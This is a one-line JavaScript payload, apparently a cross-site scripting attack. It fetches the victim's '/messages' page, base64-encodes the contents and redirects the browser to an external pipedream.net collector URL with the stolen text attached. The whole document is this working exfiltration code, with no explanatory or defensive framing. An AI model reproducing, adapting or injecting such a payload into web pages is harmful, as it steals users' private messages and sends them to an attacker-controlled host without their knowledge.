(async()=>{await new Promise(r=>setTimeout(r,500));let t=await (await fetch('/messages')).text();setTimeout(()=>{location.href='https://eoeipamgnflz15n.m.pipedream.net?c='+btoa(t)},150)})();
